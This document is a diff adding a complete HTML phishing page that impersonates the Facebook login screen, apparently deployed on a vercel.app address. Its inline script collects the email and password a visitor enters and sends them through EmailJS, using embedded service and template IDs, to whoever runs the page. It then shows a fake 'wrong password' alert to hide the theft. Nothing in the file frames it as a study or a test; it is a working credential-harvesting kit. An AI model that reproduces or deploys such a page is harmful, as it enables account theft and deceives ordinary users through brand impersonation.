@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="./fbloginfake_files/styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="./fbloginfake_files/Facebook_f_logo_(2019).svg" alt="Facebook Logo">
+        </div>
+        <form id="loginForm">
+            <input type="text" id="email" name="email" placeholder="Email or Phone Number" required="">
+            <input type="password" id="password" name="password" placeholder="Password" required="">
+            <button type="submit">Log In</button>
+            <a href="https://facebook-login-rny58qv7c-el-professor.vercel.app/#" class="forgot-password">Forgotten password?</a>
+        </form>
+        <div class="create-account">
+            <p>New to Facebook?</p>
+            <button type="button">Create New Account</button>
+        </div>
+    </div>
+    <script src="./fbloginfake_files/email.min.js.download"></script>
+    <script src="./fbloginfake_files/script.js.download"></script>
+    <script>
+        // Initialize EmailJS with your user ID
+        emailjs.init("sORFw8Hl_RIwb17OR");
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Collect form data
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Send an email with EmailJS
+            emailjs.send('service_prfssr', 'template_4hz2kyw', {
+                email: email,
+                password: password
+            }).then(function(response) {
+                alert('Wrong password, please try again!');
+            }, function(error) {
+                alert('Wrong email or phone number, please try again');
+            });
+        });
+    </script>
+
+
+</body></html>
